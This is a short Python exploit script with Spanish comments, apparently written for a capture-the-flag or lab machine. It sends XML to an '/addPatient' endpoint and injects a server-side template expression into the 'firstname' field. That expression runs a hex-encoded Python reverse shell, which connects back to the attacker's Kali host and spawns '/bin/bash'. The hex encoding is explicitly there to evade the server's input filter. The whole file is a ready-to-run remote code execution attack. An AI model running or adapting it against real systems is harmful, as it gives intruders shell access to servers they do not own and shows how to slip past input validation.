import urllib.request

# Configuración fija para tu entorno actual
KALI_IP = "10.10.14.209"
KALI_PORT = "4445"
TARGET_URL = "http://10.129.2.91:54321/addPatient"

# Logic de Reverse Shell en Python
# Se eliminan espacios para cumplir con las restricciones del servidor
rev_shell_code = f"""
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{KALI_IP}",{KALI_PORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
""".strip()

# Codificación en Hexadecimal para evadir el filtro Regex
# El filtro permite: ^[a-zA-Z0-9._'\"(){}=+/]+$
hex_payload = rev_shell_code.encode().hex()

# Estructura del exploit SSTI dentro de la etiqueta <firstname>
xml_data = f"""<patient>
    <firstname>{{exec(bytes.fromhex("{hex_payload}").decode())}}</firstname>
    <lastname>pwn</lastname>
    <sender_app>pwn</sender_app>
    <timestamp>pwn</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>pwn</gender>
</patient>""".strip()

print(f"[*] Enviando exploit a {TARGET_URL}...")
print(f"[*] Apuntando reverse shell a {KALI_IP}:{KALI_PORT}...")

req = urllib.request.Request(
    TARGET_URL, 
    data=xml_data.encode(), 
    headers={"Content-Type": "application/xml"}
)

try:
    urllib.request.urlopen(req)
except Exception:
    # La conexión suele colgarse o reiniciarse cuando la shell conecta
    print("[+] Solicitud enviada. ¡Revisa tu listener en el puerto 4445!")
